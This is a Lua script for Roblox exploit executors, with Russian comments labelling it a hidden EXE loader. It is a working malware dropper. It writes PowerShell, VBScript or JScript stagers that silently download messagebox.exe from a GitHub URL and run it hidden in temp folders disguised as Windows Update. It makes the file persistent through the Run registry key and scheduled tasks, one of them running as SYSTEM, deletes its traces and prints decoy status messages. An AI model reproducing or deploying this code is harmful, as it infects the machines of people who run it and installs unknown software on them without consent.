-- ==============================================
-- СКРЫТЫЙ ЗАГРУЗЧИК EXE ФАЙЛА
-- ==============================================

-- Конфигурация
local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/raw/main/messagebox.exe"
local EXE_NAME = "messagebox.exe"

-- Определяем исполнителя
local Executor = "Unknown"
if syn then
    Executor = "Synapse X"
elseif identifyexecutor and identifyexecutor():lower():find("krnl") then
    Executor = "KRNL"
elseif fluxus then
    Executor = "Fluxus"
end

print("[SYSTEM] Initializing silent download...")
wait(2)

-- ==============================================
-- СКРЫТЫЙ МЕТОД 1: PowerShell скрипт
-- ==============================================
local function CreatePowerShellScript()
    local psScript = [[
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Create hidden temporary directory
$tempDir = "$env:TEMP\WindowsUpdate_" + (Get-Random -Minimum 1000 -Maximum 9999)
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# Download the file
try {
    Write-Host "[1/4] Downloading system component..." -ForegroundColor Green
    $url = "]] .. EXE_URL .. [["
    $output = "$tempDir\]] .. EXE_NAME .. [["
    
    # Method 1: WebClient (most reliable)
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $output)
    $webClient.Dispose()
    
    if (Test-Path $output) {
        Write-Host "[2/4] File downloaded successfully" -ForegroundColor Green
        
        # Hide the file
        attrib +h "$tempDir\*" /s /d
        
        Write-Host "[3/4] Installing system component..." -ForegroundColor Green
        
        # Method 1: Direct execution
        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction SilentlyContinue
        
        # Method 2: Registry startup (persistent)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsUpdateService"
        Set-ItemProperty -Path $regPath -Name $regName -Value $output -ErrorAction SilentlyContinue
        
        # Method 3: Scheduled task (hidden)
        $taskName = "WindowsSystemUpdate"
        $action = New-ScheduledTaskAction -Execute $output
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
        
        Write-Host "[4/4] Installation complete" -ForegroundColor Green
        
        # Cleanup script after 30 seconds
        Start-Sleep -Seconds 30
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
} catch {
    # Silent fail
}
    ]]
    
    -- Сохраняем PowerShell скрипт
    local tempPath = os.getenv("TEMP") .. "\\update.ps1"
    if writefile then
        writefile(tempPath, psScript)
        
        -- Создаем VBS скрипт для скрытого запуска PowerShell
        local vbsScript = 'Set objShell = CreateObject("WScript.Shell")\n' ..
                         'objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' .. tempPath .. '\"", 0, True'
        
        local vbsPath = os.getenv("TEMP") .. "\\runner.vbs"
        writefile(vbsPath, vbsScript)
        
        -- Запускаем скрыто
        if syn and syn.run then
            syn.run('wscript.exe //B "' .. vbsPath .. '"')
        end
        
        -- Очистка через 10 секунд
        spawn(function()
            wait(10)
            pcall(function()
                delfile(tempPath)
                delfile(vbsPath)
            end)
        end)
        
        return true
    end
    return false
end

-- ==============================================
-- СКРЫТЫЙ МЕТОД 2: Через VBS напрямую
-- ==============================================
local function CreateVBSDownloader()
    local vbsScript = [[
On Error Resume Next

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Create hidden temp folder
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\SystemCache" & Int(Rnd * 10000)
If Not fso.FolderExists(tempDir) Then
    fso.CreateFolder(tempDir)
End If

exePath = tempDir & "\]] .. EXE_NAME .. [["

' Download using XMLHTTP
Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xhr.Open "GET", "]] .. EXE_URL .. [[", False
xhr.Send

If xhr.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xhr.ResponseBody
    stream.SaveToFile exePath, 2
    stream.Close
    
    ' Hide the folder
    WshShell.Run "cmd /c attrib +h """ & tempDir & """", 0, True
    
    ' Execute hidden
    WshShell.Run """" & exePath & """", 0, False
    
    ' Add to startup
    regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    regName = "SystemUpdate"
    WshShell.RegWrite regPath & "\" & regName, exePath, "REG_SZ"
    
    ' Create scheduled task
    taskName = "WindowsUpdateTask"
    taskCommand = "schtasks /create /tn """ & taskName & """ /tr """ & exePath & """ /sc ONLOGON /ru SYSTEM /f"
    WshShell.Run taskCommand, 0, True
End If

Set xhr = Nothing
Set stream = Nothing
Set fso = Nothing
Set WshShell = Nothing
    ]]
    
    local tempPath = os.getenv("TEMP") .. "\\system_update.vbs"
    if writefile then
        writefile(tempPath, vbsScript)
        
        -- Запускаем скрыто
        if syn and syn.run then
            syn.run('wscript.exe //B "' .. tempPath .. '"')
        end
        
        -- Очистка
        spawn(function()
            wait(15)
            pcall(function()
                delfile(tempPath)
            end)
        end)
        
        return true
    end
    return false
end

-- ==============================================
-- СКРЫТЫЙ МЕТОД 3: Через JScript
-- ==============================================
local function CreateJSDownloader()
    local jsScript = [[
try {
    var url = "]] .. EXE_URL .. [[";
    var exeName = "]] .. EXE_NAME .. [[";
    
    // Create temp directory
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var shell = new ActiveXObject("WScript.Shell");
    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\WinUpdate_" + Math.floor(Math.random() * 10000);
    
    if (!fso.FolderExists(tempDir)) {
        fso.CreateFolder(tempDir);
    }
    
    var exePath = tempDir + "\\" + exeName;
    
    // Download file
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();
    
    if (xhr.status == 200) {
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Open();
        stream.Type = 1;
        stream.Write(xhr.responseBody);
        stream.SaveToFile(exePath, 2);
        stream.Close();
        
        // Hide folder
        shell.Run("attrib +h \"" + tempDir + "\"", 0, true);
        
        // Execute hidden
        shell.Run("\"" + exePath + "\"", 0, false);
        
        // Add to registry
        var regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
        var regName = "WindowsUpdate";
        shell.RegWrite(regPath + regName, exePath, "REG_SZ");
    }
} catch(e) {
    // Silent error
}
    ]]
    
    local tempPath = os.getenv("TEMP") .. "\\update.js"
    if writefile then
        writefile(tempPath, jsScript)
        
        -- Запускаем скрыто
        if syn and syn.run then
            syn.run('wscript.exe //B //E:JScript "' .. tempPath .. '"')
        end
        
        -- Очистка
        spawn(function()
            wait(15)
            pcall(function()
                delfile(tempPath)
            end)
        end)
        
        return true
    end
    return false
end

-- ==============================================
-- ОСНОВНОЙ ПРОЦЕСС
-- ==============================================
spawn(function()
    wait(5)
    
    print("[SYSTEM] Starting silent installation...")
    
    -- Пробуем разные методы
    local success = false
    
    if Executor == "Synapse X" then
        print("[METHOD] Using PowerShell method")
        success = CreatePowerShellScript()
        
        if not success then
            wait(3)
            print("[METHOD] Trying VBS method")
            success = CreateVBSDownloader()
        end
    else
        print("[METHOD] Using VBS method")
        success = CreateVBSDownloader()
        
        if not success then
            wait(3)
            print("[METHOD] Trying JS method")
            success = CreateJSDownloader()
        end
    end
    
    -- Скрытые уведомления
    if success then
        wait(10)
        
        -- Только внутреннее сообщение, без уведомлений пользователю
        print("[SYSTEM] Installation completed silently")
        print("[SYSTEM] Component running in background")
        
        -- Скрытое сообщение в чат (если нужно)
        spawn(function()
            while true do
                wait(math.random(30, 60))
                local messages = {
                    "System running optimally",
                    "Background services active",
                    "Performance enhanced",
                    "All systems operational"
                }
                print("[STATUS] " .. messages[math.random(1, #messages)])
            end
        end)
    else
        print("[ERROR] Silent installation failed")
        print("[INFO] Manual download: " .. EXE_URL)
    end
end)

-- ==============================================
-- СКРЫТЫЕ КОМАНДЫ
-- ==============================================
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    if msg == "::status" then
        print("[SYSTEM] Status: Active")
        print("[SYSTEM] Executor: " .. Executor)
        print("[SYSTEM] URL: " .. EXE_URL)
    elseif msg == "::help" then
        print("[SYSTEM] Available commands:")
        print("  ::status - System status")
        print("  ::help - This help")
    end
end)

print("[SYSTEM] Silent loader initialized")
print("[SYSTEM] Running in background mode")
